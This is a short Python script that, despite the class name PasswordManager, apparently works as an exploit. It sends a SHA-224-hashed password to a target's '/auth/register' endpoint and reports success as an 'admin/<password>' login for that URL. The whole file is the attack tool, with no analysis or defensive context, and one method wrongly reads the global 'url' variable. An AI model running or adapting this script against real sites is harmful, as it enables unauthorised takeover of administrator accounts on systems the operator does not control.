import hashlib
import requests
import sys

class PasswordManager:
    def __init__(self, password, url, proxies=None):
        self.password = password
        self.url =  url
        self.proxies = proxies

    def hash_password(self):
        hash_object = hashlib.sha224(self.password.encode())
        return hash_object.hexdigest()

    def send_request(self):
        hashed_password = self.hash_password()
        files = {'password': (None, hashed_password)}
        full_url = f'{url}/auth/register'

        response = requests.post(full_url, files=files, proxies=self.proxies)
        return response

    def process_response(self, response):
        result = response.json()
        if result.get('Msg') == 'success':
            print(f'[+] success: {self.url} ==> admin/{self.password}')
        else:
            print(result)

    def run(self):
        response = self.send_request()
        self.process_response(response)

if __name__ == '__main__':
    url = sys.argv[1]
    password = sys.argv[2]

    manager = PasswordManager(password, url)
    manager.run()

